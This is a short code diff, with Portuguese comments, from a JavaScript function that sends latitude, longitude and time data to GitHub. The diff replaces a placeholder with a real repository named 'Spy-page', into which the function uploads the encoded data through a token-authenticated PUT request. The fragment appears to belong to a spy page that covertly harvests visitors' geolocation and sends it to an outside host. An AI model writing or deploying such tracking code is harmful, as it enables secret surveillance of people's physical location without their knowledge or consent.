@@ -37,7 +37,7 @@ function sendDataToGitHub(lat, lon, time) {
     const encodedContent = btoa(content); // Codifica o conteúdo em base64
 
     // Requisição para criar/editar o arquivo no GitHub
-    fetch(`https://api.github.com/repos/SEU_USUARIO/${repo}/contents/${path}`, {
+    fetch(`https://api.github.com/repos/rlkkSky/Spy-page/contents/${path}`, {
         method: 'PUT',
         headers: {
             'Authorization': `token ${token}`,
